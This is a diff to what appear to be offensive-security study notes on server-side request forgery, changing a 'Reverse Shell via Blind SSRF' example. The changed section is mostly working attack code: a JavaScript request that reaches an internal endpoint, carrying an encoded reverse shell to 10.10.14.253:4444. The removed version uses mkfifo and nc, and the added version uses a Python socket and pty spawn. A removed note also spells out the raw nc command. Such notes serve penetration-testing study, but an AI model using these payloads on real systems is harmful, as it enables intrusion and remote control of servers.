@@ -63,14 +63,14 @@ Additionally, we can also use this technique to gain remote code execution (RCE)
         <b>Reverse Shell via Blind SSRF</b>
         <script>
         var http = new XMLHttpRequest();
-        http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=rm%252520%25252Ftmp%25252Ff%25253Bmkfifo%252520%25252Ftmp%25252Ff%25253Bcat%252520%25252Ftmp%25252Ff%25257Csh%252520-i%2525202%25253E%2525261%25257Cnc%25252010.10.14.253%2525204444%252520%25253E%25252Ftmp%25252Ff%25250A%250A%0A", true); 
+        http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.14.253%2522%253Bexport%2520RPORT%253D4444%253Bpython3%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527", true); 
         http.send();
         http.onerror = function(){document.write('<a>Oops!</a>');}
         </script>
     </body>
 </html>
 ```
-> Note: The payload is encoded using the following command: `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.253 4444 >/tmp/f" | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri`. We can look for different reverse shell payloads at [revshells.com](https://revshells.com).
+> Note: The payload is URL encoded twice. Utilise [revshells.com](https://revshells.com) for different shell payloads.
 ## SSRF Chain with XSS
 If these inputs are non-sanitized, this can lead to a SSRF by chaining it with a [Cross Site Scripting](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FClient-side%20Vulnerabilities%2FCross-Site%20Scripting%2FIntroduction) (XSS) attack.
 
